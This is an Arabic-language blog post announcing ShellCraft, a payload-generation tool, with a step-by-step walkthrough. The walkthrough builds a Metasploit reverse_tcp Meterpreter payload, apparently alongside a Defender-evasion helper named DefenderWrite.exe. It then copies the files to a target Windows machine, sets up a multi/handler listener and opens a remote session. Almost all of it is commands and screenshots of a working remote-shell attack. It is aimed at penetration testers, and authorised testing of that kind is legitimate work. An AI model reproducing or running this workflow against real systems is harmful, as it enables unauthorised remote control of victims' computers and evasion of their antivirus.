أهلاً بكم في أول تدوينة تقنية لفريق HackScale.

يسعدنا اليوم الإعلان عن إطلاق أداتنا الجديدة ShellCraft، وهي أداة صُممت لتسهيل عمل الباحثين الأمنيين ومختصي اختبار الاختراق عند التعامل مع Shellcodes وإنشاء Payloads بطريقة سريعة ومنظمة.

في هذه التدوينة سنتعرف على كيفية تثبيت الأداة واستخدامها لإنشاء Metasploit payload والحصول على Meterpreter session على نظام ويندوز.

لنبدأ.

# استنساخ المستودع

أولاً نقوم بنسخ رابط الأداة من المستودع: على GitHub.

![clone](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0270.png)

ثم نقوم بتحميلها إلى النظام باستخدام الأمر التالي:

```
git clone https://github.com/HackScaleTeam/ShellCraft
```
 ![install](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0271.png)


# الدخول إلى مجلد الأداة

بعد اكتمال التحميل ندخل إلى مجلد الأداة:
```
cd ShellCraft
```
![cd](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0272.png)

ولعرض الملفات الموجودة داخل المجلد نستخدم الأمر:
```
ls
```


## تثبيت متطلبات الأداة

نقوم بجعل سكربت التثبيت قابلًا للتنفيذ باستخدام الأمر:
```
chmod +x install.sh
```

ثم نقوم بتشغيله لتثبيت جميع متطلبات الأداة:
```
sudo ./install.sh
```
![chmod](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0273.png)


# إنشاء Payload باستخدام ShellCraft

بعد اكتمال التثبيت يمكننا تشغيل الأداة وإنشاء Metasploit payload باستخدام الأمر التالي:
```
python3 shellcraft.py --msf 172.16.166.130 4444 -o payload.exe
```
قم بتغيير IP إلى عنوان جهازك، واختر المنفذ (Port) الذي تريده.

الخيار -o يعني تحديد اسم ملف الإخراج، وفي هذا المثال اخترنا الاسم payload.exe، ويمكنك اختيار أي اسم تريده.

![exam](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0276.png)


# الملفات التي سيتم إنشاؤها

بعد تنفيذ الأمر السابق ستقوم الأداة بإنشاء ثلاثة ملفات:
```
payload.exe
payload.dll
DefenderWrite.exe
```
![3](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0277.png)

بعد ذلك نقوم بنقل هذه الملفات إلى نظام ويندوز المستهدف.
![exm](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0278.png)



# تشغيل Listener في Metasploit

قبل تشغيل الملفات على النظام المستهدف، يجب تشغيل listener في Metasploit.

نبدأ بتشغيل Metasploit :
```
msfconsloe
```
![msf](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0279.png)

 ومن ثم تشغيل الامر التالي :
```
use exploit/multi/handler
```


ثم نحدد نوع الـ payload:
```
set payload windows/meterpreter/reverse_tcp
```


بعد ذلك نقوم بتحديد عنوان IP والمنفذ الخاصين بنا:
```
set LHOST 172.16.166.130
set LPORT 4444
```
![msd](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0280.png)

## تشغيل الـ Payload على النظام المستهدف

ننتقل الآن إلى نظام ويندوز ونقوم بتشغيل الملف:
```
payload.exe
```
كـ مسؤول (Run as Administrator).

⚠️ تأكد من أن الملفات الثلاثة موجودة في نفس المجلد.

![win](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0281.png)


# الحصول على Meterpreter Session

بعد تشغيل الملف على النظام المستهدف، نعود إلى Metasploit.

كما نرى في الصورة التالية، تم الحصول على Reverse Connection بنجاح وفتح Meterpreter session.

![r](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0282.png)

نشغل الامر sysinfo لمعرفة تفاصيل النظام :
![e](https://github.com/HackScaleTeam/hackscaleteam.github.io/blob/main/_posts/shell_img/IMG_0283.png)


# الخاتمة

بهذا نكون قد استعرضنا طريقة استخدام أداة ShellCraft لإنشاء Metasploit payload والحصول على Meterpreter session بطريقة بسيطة وسريعة.

هذه الأداة ما زالت في مرحلة التطوير، ونعمل باستمرار على تحسينها وإضافة ميزات جديدة تساعد الباحثين الأمنيين ومختصي اختبار الاختراق في عملهم اليومي.

إذا كان لديك أي اقتراحات أو ملاحظات فلا تتردد في مشاركتها معنا عبر GitHub.

ترقبوا المزيد من الأدوات والشروحات التقنية القادمة من فريق HackScale.
